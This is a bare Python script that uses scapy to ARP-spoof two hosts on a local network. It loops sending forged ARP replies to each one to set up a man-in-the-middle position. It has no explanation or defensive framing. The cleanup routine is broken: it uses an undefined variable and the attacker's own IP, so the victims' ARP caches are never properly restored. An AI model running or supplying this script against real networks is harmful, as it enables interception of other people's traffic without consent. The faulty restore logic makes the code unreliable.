#!/usr/bin/env python

import scapy.all as scapy
import time

target_ip_1 = "xxx.xxx.xxx.xxx"
target_ip_2 = "xxx.xxx.xxx.xxx"
target_mac_1 = "ff:ff:ff:ff:ff:ff"
target_mac_2 = "ff:ff:ff:ff:ff:ff"
my_ip = "xxx.xxx.xxx.xxx"

def spoof(target_ip, target_mac, spoof_ip):
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet)

def restore(dest_ip, dest_mac ,source_ip):
	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet)

try:
	print("[+] Start spoof")
	while True:
		spoof(target_ip_1, target_mac_1, target_ip_2)
		spoof(target_ip_2, target_mac_2, target_ip_1)
		time.sleep(2)
except KeyboardInterrupt:
	print("[-] Exit")
	restore(target_ip_1, target_mac_1, my_ip)
	restore(target_ip_2, target_mac_2, my_ip)
